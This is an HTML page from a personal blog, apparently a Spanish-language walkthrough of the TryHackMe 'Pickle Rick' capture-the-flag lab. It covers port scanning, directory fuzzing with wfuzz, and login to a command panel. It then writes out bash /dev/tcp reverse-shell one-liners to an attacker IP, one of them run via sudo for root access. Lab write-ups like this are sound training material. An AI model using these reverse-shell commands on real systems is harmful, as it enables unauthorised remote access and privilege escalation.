@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>pickle Rick</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>pickle Rick | TryHackme</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="pickle Rick" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Maquina a vulnerar Pickle Rick Url : Pickle Rick" />
+<meta property="og:description" content="Maquina a vulnerar Pickle Rick Url : Pickle Rick" />
+<link rel="canonical" href="http://localhost/pickleRick" />
+<meta property="og:url" content="http://localhost/pickleRick" />
+<meta property="og:site_name" content="TryHackme" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-05-24T00:00:00-04:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="pickle Rick" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-05-24T00:00:00-04:00","datePublished":"2023-05-24T00:00:00-04:00","description":"Maquina a vulnerar Pickle Rick Url : Pickle Rick","headline":"pickle Rick","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost/pickleRick"},"url":"http://localhost/pickleRick"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>somehacker@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>pickle Rick</h2>
+  <time datetime="2023-05-24T00:00:00-04:00" class="by-line">24 May 2023</time>
+  <hr />
+<p>Maquina a vulnerar Pickle Rick</p>
+<blockquote>
+  <p>Url : <a href="https://tryhackme.com/room/picklerick"> Pickle Rick </a></p>
+</blockquote>
+<p></p>
+<hr />
+
+<p>Empezaremos viendo a que sistema operativo nos enfrentamos.</p>
+<p><img src="/imgs/pickleRick/pickleRick1.jpg" /></p>
+<p> Vemos que el ttl es de 63 lo cual hace referencia a una maquina linux, ahora veremos que puertos estan abiertos.</p>
+<p><img src="/imgs/pickleRick/pickleRick2.jpg" /></p>
+<p>Puerto 22/ssh y 80/http , ya intente conectarme por ssh pero me arroja permiso denyed, mirando el codigo del html de el puerto 80, me topo que en el codigo hay un usario : <font color="yellow">R1ckRul3s</font></p>
+<p><img src="/imgs/pickleRick/pickleRick3.jpg" /></p>
+<p>Ahora lo que hare sera enumerar directorios activos en la pagina web, con la herramiento <font color="gold">wfuzz</font></p>
+<blockquote>
+  <p>wfuzz -t 200 –hc=404 -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.181.144/FUZZ</p>
+</blockquote>
+<p></p>
+<p><img src="/imgs/pickleRick/pickleRick4.jpg" /></p>
+<p>Vemos que directamente hay un robots.txt el cual al verlo en la pagnia web parece un tipo de contra.</p>
+<p><img src="/imgs/pickleRick/pickleRick5.jpg" /></p>
+<p>Posterior mente me doy cuenta que existe un login.php</p>
+<p><img src="/imgs/pickleRick/pickleRick6.jpg" /></p>
+<p>El cual con el usuario anterior encontrado y la contra me lleva a un panel con ejecucion remota de comandos</p>
+<blockquote>
+  <p>/bin/bash -c  “bash -i &gt;&amp; /dev/tcp/10.18.27.215/444 0&gt;&amp;1”</p>
+</blockquote>
+<p></p>
+<p><img src="/imgs/pickleRick/pickleRick7.jpg" /></p>
+<p>Lo cual me aprovecho de la ejecucion remota de coamando para hacerme una web shell </p>
+<p><img src="/imgs/pickleRick/pickleRick8.jpg" /></p>
+<p>Posteriormente me doy cuenta que el usuario www-data puede ejecutar cualquier comando</p>
+<blockquote>
+  <p>sudo -l</p>
+</blockquote>
+<p></p>
+<p><img src="/imgs/pickleRick/pickleRick9.jpg" /></p>
+<p>Entonces me hago una reverse sell con el sudo</p>
+<blockquote>
+  <p>sudo /bin/bash -c “bash -i &gt;&amp; /dev/tcp/10.18.27.215/445 0&gt;&amp;1”</p>
+</blockquote>
+<p></p>
+<p><img src="/imgs/pickleRick/pickleRick10.jpg" /></p>
+<p>Ok maquina <font color="red">Vulnerada</font></p>
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https:/">
+    <span>
+        <b>SomeHacker</b>
+    </span>
+    
+    <span>© 2023</span>
+  </a>
+</footer>
+
+
+  
+</body>
+
+</html>
